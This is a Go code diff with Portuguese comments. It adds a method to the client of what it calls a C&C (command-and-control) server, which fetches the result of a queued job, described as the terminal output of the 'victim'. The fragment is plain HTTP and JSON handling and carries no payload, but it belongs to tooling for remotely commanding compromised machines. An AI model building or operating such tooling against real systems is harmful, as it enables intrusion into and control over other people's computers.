@@ -114,3 +114,46 @@ func (c *ClientHTTP) SendCommand(command string, args []string, agentID string) 
 
 	return jobID, nil
 }
+
+func (c *ClientHTTP) RequestJobResult(jobID string) (string, error) {
+	// 1. Monta a URL de leitura do resultado no C&C
+	url := c.serverURL + "/api/jobs/" + jobID + "/result"
+
+	// 2. Prepara a requisição GET
+	req, err := http.NewRequest(http.MethodGet, url, nil)
+	if err != nil {
+		return "", err
+	}
+
+	// 3. Dispara a requisição
+	resp, err := c.httpClient.Do(req)
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+
+	// 4. Valida se o Servidor encontrou o comando
+	if resp.StatusCode != http.StatusOK {
+		return "", errors.New("falha ao ler resultado, status: " + resp.Status)
+	}
+
+	// 5. Lemos a resposta JSON enviada pelo Servidor
+	var result map[string]interface{}
+	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
+		return "", err
+	}
+
+	// 6. Verificamos se a chave "output" existe e não é nula
+	outputVal, ok := result["output"]
+	if !ok || outputVal == nil {
+		return "", errors.New("resultado ainda não está pronto ou é vazio")
+	}
+
+	// 7. Extraímos a string com a saída do terminal da vítima
+	output, ok := outputVal.(string)
+	if !ok {
+		return "", errors.New("formato de output inválido no servidor")
+	}
+
+	return output, nil
+}
